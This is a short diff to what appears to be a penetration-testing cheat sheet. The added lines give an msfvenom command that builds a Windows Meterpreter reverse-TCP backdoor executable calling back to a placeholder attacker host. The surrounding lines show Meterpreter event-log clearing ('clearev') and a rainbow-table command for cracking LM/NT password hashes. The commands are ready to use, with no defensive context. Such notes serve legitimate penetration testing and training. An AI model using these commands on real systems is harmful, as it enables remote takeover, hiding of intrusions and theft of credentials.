@@ -175,6 +175,10 @@ Meterpreter session 1 opened!
 > clearev
 ```
 ```
+Generate Backdoor
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=AttackerIP LPORT=5555 -f exe > shell.exe
+```
+```
 Crack collected LM/NT hashes w/ Rainbow Tables
 $ sudo rcracki_mt -h <first 8bits (16chars) of LM hash> -t 4 *.rti // uses a folder of rainbow tables to extract plaintext of first 8 bytes
 
